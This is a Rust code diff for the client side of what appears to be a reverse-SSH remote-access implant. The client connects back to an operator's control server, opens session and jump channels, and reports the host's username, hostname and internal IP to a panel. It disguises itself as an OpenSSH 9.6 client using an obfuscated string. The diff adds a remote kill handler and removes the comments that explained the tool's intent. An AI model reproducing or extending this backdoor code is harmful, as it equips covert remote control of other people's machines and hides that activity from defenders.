@@ -37,6 +37,11 @@ impl Handler for ClientHandler {
         Ok(fp == self.fingerprint.to_lowercase())
     }
 
+    async fn server_kill_request(&mut self, _session: &mut Session) -> Result<(), Self::Error> {
+        tokio::time::sleep(std::time::Duration::from_millis(500)).await;
+        std::process::exit(0);
+    }
+
     async fn should_accept_unknown_server_channel(
         &mut self,
         _id: ChannelId,
@@ -51,7 +56,6 @@ impl Handler for ClientHandler {
         reply: ChannelOpenHandle,
         _session: &mut Session,
     ) -> Result<(), Self::Error> {
-        // "jump" channel: in-process SSH server for the operator (ssh -J)
         let key = self.key.clone();
         reply.accept().await;
         tokio::spawn(async move {
@@ -60,7 +64,6 @@ impl Handler for ClientHandler {
         Ok(())
     }
 
-    // ---- control-connection session handling (reverse-ssh semantics) ----
 
     async fn server_channel_open_session(
         &mut self,
@@ -236,10 +239,6 @@ pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
 
     let mut config = client::Config::default();
     config.keepalive_interval = Some(std::time::Duration::from_secs(15));
-    // default identification looks like a stock OpenSSH client instead of
-    // leaking the library name; the -<os>_<arch> suffix follows the Go client
-    // convention so the server can show the OS, and an explicit
-    // --version-string still wins
     let os = match std::env::consts::OS {
         "macos" => "darwin",
         other => other,
@@ -251,8 +250,6 @@ pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
         other => other,
     };
     let base = crate::ob!("SSH-2.0-OpenSSH_9.6");
-    // Standard appends the RFC \r\n terminator; Raw sends the buffer as-is
-    // and breaks the server-side version line reader.
     config.client_id = russh::SshId::Standard(format!("{base}-{os}_{arch}").into());
     if !cfg.version_string.is_empty() {
         let mut ver = cfg.version_string.clone();
@@ -269,7 +266,6 @@ pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
         sessions: Arc::new(Mutex::new(HashMap::new())),
     };
 
-    // Transport: plain TCP or TLS (tls:// scheme), like the Go client.
     trait NetStream: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
     impl<T> NetStream for T where T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
     let stream: Box<dyn NetStream> = match scheme {
@@ -289,7 +285,6 @@ pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
         .map_err(|e| format!("connect: {e}"))?;
     dbg("transport + kex ok");
 
-    // username mirrors the Go client: user.hostname
     let user = format!("{}.{}", crate::sy::username(), crate::sy::hostname());
 
     let auth_key = crate::ky::load()?;
@@ -303,11 +298,10 @@ pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
     }
     dbg("auth ok, serving");
 
-    // Mirror the Go client: publish the default-route LAN address so the
-    // panel can show internal/external IPs and place the host on the map.
+    crate::report::set_control(handle.clone());
+
     if let Some(internal) = crate::ip::internal_ip() {
         let mut payload = Vec::new();
-        // SSH string: 4-byte length + body
         payload.extend_from_slice(&(internal.len() as u32).to_be_bytes());
         payload.extend_from_slice(internal.as_bytes());
         let _ = handle
@@ -315,7 +309,6 @@ pub async fn connect_and_serve(cfg: &Arc<Config>) -> Result<(), String> {
             .await;
     }
 
-    // Wait for the session task to end (disconnect etc.)
     let r = handle.await.map_err(|e| format!("session: {e}"));
     dbg("session ended");
     r
